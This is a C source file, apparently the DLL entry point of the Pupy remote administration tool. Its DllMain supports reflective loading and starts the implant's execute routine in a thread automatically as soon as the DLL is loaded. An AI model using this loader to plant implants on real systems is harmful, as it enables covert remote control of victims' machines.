/*
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
*/

#include <windows.h>
#include "pupy_load.h"
#include "debug.h"
#include "ReflectiveLoader.h"

#include "Python-dynload.h"
#include "jni_on_load.c"

extern HINSTANCE hAppInstance;

#define REFLECTIVE_SPECIAL 5

HANDLE hThread = NULL;

//===============================================================================================//

DWORD WINAPI delayedMainThread(LPVOID lpArg)
{
    Sleep(1000);
    return execute(lpArg);
}

__declspec(dllexport)
VOID WINAPI Launch()
{
    execute(NULL);
}

BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    DWORD threadId;
    BOOL bReturnValue = TRUE;

    dprint("Call DllMain %d/%p\n", dwReason, lpReserved);

    switch( dwReason )
    {
        case DLL_QUERY_HMODULE:
            if( lpReserved != NULL )
                *(HMODULE *)lpReserved = hAppInstance;
        break;

        case DLL_THREAD_ATTACH:
            break;

        case DLL_PROCESS_ATTACH:
            hAppInstance = hinstDLL;

            initialize(TRUE);

            if (lpReserved == (LPVOID) 0x1) {
                dprint("Special: Request for non-delayed thread\n");
                execute(NULL);
                return TRUE;
            }

            if (!hThread && lpReserved != (LPVOID) 0x2) {
                dprint("Creating delayed thread from DllMain\n");

                hThread = CreateThread(
                    NULL,
                    0,      // dwStackSize
                    (LPTHREAD_START_ROUTINE) delayedMainThread,     // lpStartAddress
                    NULL,       // lpParameter
                    0,      // dwCreationFlags (0==run right after creation)
                    &threadId
               );
            }
            break;

        case DLL_THREAD_DETACH:
            break;

        case DLL_PROCESS_DETACH:
            dprint("Call deinitializer: %d\n", dwReason);
            if (hThread) {
                dprint("Wait until %p exited, reason: %d\n", hThread, dwReason);
                WaitForMultipleObjects(1, &hThread, TRUE, INFINITE);
                dprint("%p exited, completed\n", hThread);
            }

            deinitialize();
            break;
    }

    dprint("Call DllMain - completed\n");
    return bReturnValue;
}
